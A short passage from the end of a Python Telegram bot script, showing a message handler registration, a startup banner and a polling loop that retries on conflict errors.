    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("👑 Universal Bot started (Download + Search + Cookie + Account + Rewards)")
    
    # Retry on conflict (old instance still dying)
    while True:
        try:
            app.run_polling(drop_pending_updates=True)
        except telegram.error.Conflict:
            print("⚠️ Conflict detected – retrying in 5 seconds...")
            time.sleep(5)
        except KeyboardInterrupt:
            print("Bot stopped manually.")
            break

if __name__ == "__main__":
    main()
